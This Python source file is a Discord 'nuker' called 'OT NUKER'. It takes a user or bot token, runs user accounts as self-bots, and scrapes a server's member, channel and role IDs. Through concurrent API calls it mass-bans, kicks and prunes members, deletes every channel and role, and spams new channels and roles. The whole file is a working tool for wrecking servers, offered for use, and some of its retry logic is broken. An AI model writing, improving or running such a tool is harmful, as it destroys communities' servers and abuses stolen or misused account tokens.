import asyncio
import aiohttp
import tasksio
import nextcord
import os
import requests
from nextcord.ext import commands

token = input("=> Token: ")


def checkT(token):
    if requests.get("https://discord.com/api/v9/users/@me",
                    headers={
                        "authorization": token
                    }).status_code == 200:
        return "user"
    else:
        return "bot"


token_type = checkT(token)
if token_type == "user":
    headers = {'authorization': token}
    client = commands.Bot(command_prefix="bhenchodidkk",
                          intents=nextcord.Intents.all(),
                          self_bot=True)
elif token_type == "bot":
    headers = {'authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix="bhenchodidkk",
                          intents=nextcord.Intents.all())
os.system("clear")
members = open("OldTown/members.txt").read().split("\n")
channels = open("OldTown/channels.txt").read().split("\n")
roles = open("OldTown/roles.txt").read().split("\n")


class ot:
    async def scrape(g):
        guild1 = client.get_guild(int(g))
        member = guild1.members
        channel = guild1.channels
        role = guild1.roles
        with open("OldTown/members.txt", "w") as f:
            for m in member:
                f.write(f"{m.id}\n")
        with open("OldTown/channels.txt", "w") as f:
            for ch in channel:
                f.write(f"{ch.id}\n")
        with open("OldTown/roles.txt", "w") as f:
            for r in role:
                f.write(f"{r.id}\n")
        os.system("clear")
        print(
            f"Scraped {len(member)} members!\nScraped {len(channel)} channels!\nScraped {len(role)} roles!\nRestart nuker to use it!"
        )

    async def ban(g, m):
        async with aiohttp.ClientSession() as s:
            async with s.put(f"https://discord.com/api/v9/guilds/{g}/bans/{m}",
                             headers=headers) as ss:
                if ss.status in (200, 201, 204):
                    print(f"\033[32m=> Banned {m}\033[0m")
                else:
                    try:
                        print(f"\033[31m=> Retrying to ban {m}\033[0m")
                        await ot.ban(m)
                    except:
                        print(f"\033[31m=> Couldn't ban {m}\033[0m")

    async def kick(g, m):
        async with aiohttp.ClientSession() as s:
            async with s.delete(
                    f"https://discord.com/api/v9/guilds/{g}/members/{m}",
                    headers=headers) as ss:
                if ss.status in (200, 201, 204):
                    print(f"\033[32m=> Kicked {m}\033[0m")
                else:
                    try:
                        print(f"\033[31m=> Retrying to kick {m}\033[0m")
                        await ot.ban(m)
                    except:
                        print(f"\033[31m=> Couldn't kick {m}\033[0m")

    async def unban(g, m):
        async with aiohttp.ClientSession() as s:
            async with s.delete(
                    f"https://discord.com/api/v9/guilds/{g}/bans/{m}",
                    headers=headers) as ss:
                if ss.status in (200, 201, 204):
                    print(f"\033[32m=> Unbanned {m}\033[0m")
                else:
                    try:
                        print(f"\033[31m=> Retrying to unban {m}\033[0m")
                        await ot.ban(m)
                    except:
                        print(f"\033[31m=> Couldn't unban {m}\033[0m")

    async def roledel(g, r):
        async with aiohttp.ClientSession() as s:
            async with s.delete(
                    f"https://discord.com/api/v9/guilds/{g}/roles/{r}",
                    headers=headers) as ss:
                if ss.status in (200, 201, 204):
                    print(f"\033[32m=> Deleted {r}\033[0m")
                else:
                    try:
                        print(f"\033[31m=> Retrying to delete {r}\033[0m")
                        await ot.roledel(r)
                    except:
                        print(f"\033[31m=> Couldn't delete {r}\033[0m")

    async def chdel(ch):
        async with aiohttp.ClientSession() as s:
            async with s.delete(f"https://discord.com/api/v9/channels/{ch}",
                                headers=headers) as ss:
                if ss.status in (200, 201, 204):
                    print(f"\033[32m=> Deleted {ch}\033[0m")
                else:
                    try:
                        print(f"\033[31m=> Retrying to delete {ch}\033[0m")
                        await ot.chdel(ch)
                    except:
                        print(f"\033[31m=> Couldn't delete {ch}\033[0m")

    async def chcreate(g, name, type):
        async with aiohttp.ClientSession() as s:
            json = {"name": name, "type": type}
            async with s.post(
                    f"https://discord.com/api/v9/guilds/{g}/channels",
                    headers=headers,
                    json=json) as ss:
                if ss.status in (200, 201, 204):
                    print(f"\033[32m=> Created {name}\033[0m")
                else:
                    try:
                        print(f"\033[31m=> Retrying to create {name}\033[0m")
                        await ot.chcreate(g, name, type)
                    except:
                        print(f"\033[31m=> Couldn't create {name}\033[0m")

    async def rcreate(g, name):
        async with aiohttp.ClientSession() as s:
            json = {"name": name}
            async with s.post(f"https://discord.com/api/v9/guilds/{g}/roles",
                              headers=headers,
                              json=json) as ss:
                if ss.status in (200, 201, 204):
                    print(f"\033[32m=> Created {name}\033[0m")
                else:
                    try:
                        print(f"\033[31m=> Retrying to create {name}\033[0m")
                        await ot.rcreate(g, name)
                    except:
                        print(f"\033[31m=> Couldn't create {name}\033[0m")

    async def prune(g):
        guild = client.get_guild(int(g))
        await guild.prune_members(days=1, roles=guild.roles, reason="OT NUKER")
        os.system("clear")
        print(f"\033[1;49;32m=> Pruned {guild.name} successfully\033[0m")

    async def pruneexec():
        os.system("clear")
        g = input("=> Guild: ")
        await ot.prune(g)

    async def banexec():
        os.system("clear")
        g = input("=> Guild: ")
        async with tasksio.TaskPool(13) as p:
            for m in members:
                await p.put(ot.ban(g, m))

    async def kickexec():
        os.system("clear")
        g = input("=> Guild: ")
        async with tasksio.TaskPool(13) as p:
            for m in members:
                await p.put(ot.kick(g, m))

    async def unbanexec():
        os.system("clear")
        g = input("=> Guild: ")
        async with tasksio.TaskPool(13) as p:
            for m in members:
                await p.put(ot.unban(g, m))

    async def roledelexec():
        os.system("clear")
        g = input("=> Guild: ")
        async with tasksio.TaskPool(13) as p:
            for r in roles:
                await p.put(ot.roledel(g, r))

    async def chdelexec():
        os.system("clear")
        async with tasksio.TaskPool(13) as p:
            for ch in channels:
                await p.put(ot.chdel(ch))

    async def chcreateexec():
        os.system("clear")
        g = input("=> Guild: ")
        name = input("=> Channel Name: ")
        t = input("=> Voice channel [y/n]: ")
        if t == "y":
            type = 2
        elif t == "n":
            type = 0
        else:
            print("invalid option ;-;")
            return
        amount = input("=> Amount: ")
        async with tasksio.TaskPool(13) as p:
            for xxo in range(int(amount)):
                await p.put(ot.chcreate(g, name, type))

    async def rcreateexec():
        os.system("clear")
        g = input("=> Guild: ")
        name = input("=> Role name: ")
        a = input("=> Amount: ")
        async with tasksio.TaskPool(13) as p:
            for ch in range(int(a)):
                await p.put(ot.rcreate(g, name))

    async def main():
        os.system("title OT NUKER | discord.gg/otop")
        print("""
    ░█████╗░  ████████╗
    ██╔══██╗  ╚══██╔══╝
    ██║░░██║  ░░░██║░░░
    ██║░░██║  ░░░██║░░░
    ╚█████╔╝  ░░░██║░░░
    ░╚════╝░  ░░░╚═╝░░░

  1: Ban users        2: Unban users
  3: Scrape           4: Kick users
  5: Create channels  6: Delete channels
  7: Create roles     8: Delete roles
  9: Prune users     
          """)
        ch = int(input("Choice: "))
        if ch == 3:
            os.system("clear")
            g = input("=> Guild: ")
            await ot.scrape(g)
            await asyncio.sleep(5)
            os.system("clear")
            await ot.main()
        elif ch == 1:
            await ot.banexec()
            await asyncio.sleep(5)
            os.system("clear")
        elif ch == 2:
            await ot.unbanexec()
            await asyncio.sleep(5)
            os.system("clear")
            await ot.main()
        elif ch == 9:
            await ot.pruneexec()
            await asyncio.sleep(5)
            os.system("clear")
            await ot.main()
        elif ch == 8:
            await ot.roledelexec()
            await asyncio.sleep(5)
            os.system("clear")
            await ot.main()
        elif ch == 6:
            await ot.chdelexec()
            await asyncio.sleep(5)
            os.system("clear")
            await ot.main()
        elif ch == 5:
            await ot.chcreateexec()
            await asyncio.sleep(5)
            os.system("clear")
            await ot.main()
        elif ch == 7:
            await ot.rcreateexec()
            await asyncio.sleep(5)
            os.system("clear")
            await ot.main()
        elif ch == 4:
            await ot.kickexec()
            await asyncio.sleep(5)
            os.system("clear")
            await ot.main()
        else:
            os.system("clear")
            print("invalid")
            await asyncio.sleep(5)
            os.system("clear")
            await ot.main()


client.remove_command("help")


@client.event
async def on_ready():
    await client.change_presence(status=nextcord.Status.offline)
    await ot.main()


if token_type == "user":
    client.run(token, bot=False)
elif token_type == "bot":
    client.run(token)
